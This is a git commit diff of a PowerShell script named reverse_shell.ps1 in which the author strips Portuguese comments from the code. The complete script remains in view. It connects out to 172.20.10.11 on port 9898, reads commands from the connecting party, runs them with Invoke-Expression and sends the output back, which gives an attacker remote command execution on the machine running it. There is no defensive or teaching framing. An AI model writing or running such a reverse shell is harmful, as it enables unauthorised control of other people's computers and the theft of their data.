ec6d9b2c915547d144224f68f6a807b1f58ed962
Martins <94647646+Saul-Martins@users.noreply.github.com>
2024-12-26 14:21:15 -0300

    Update reverse_shell.ps1

--- reverse_shell.ps1
+++ reverse_shell.ps1
@@ -1,18 +1,16 @@
-$ip = "172.20.10.11"  # Seu IP público
-$port = 9898  # A porta onde o ngrok está escutando
+$ip = "172.20.10.11" 
+$port = 9898  
 
-# Cria a conexão de reverse shell
 $tcp = New-Object System.Net.Sockets.TCPClient($ip, $port)
 $stream = $tcp.GetStream()
 
-# Conecta a entrada e saída da máquina para o atacante
 [byte[]]$bytes = 0..255 | ForEach-Object { 0 }
 while ($true) {
-    # Lê a entrada do atacante
+   
     $i = $stream.Read($bytes, 0, $bytes.Length)
     if ($i -eq 0) { break }
     
-    # Converte os dados recebidos em string e executa os comandos
+    
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
     $sendback = (Invoke-Expression $data 2>&1) | Out-String
     $sendback2 = $sendback + "PS " + (pwd).Path + "> "
@@ -21,5 +19,4 @@ while ($true) {
     $stream.Flush()
 }
 
-# Fecha a conexão
 $tcp.Close()
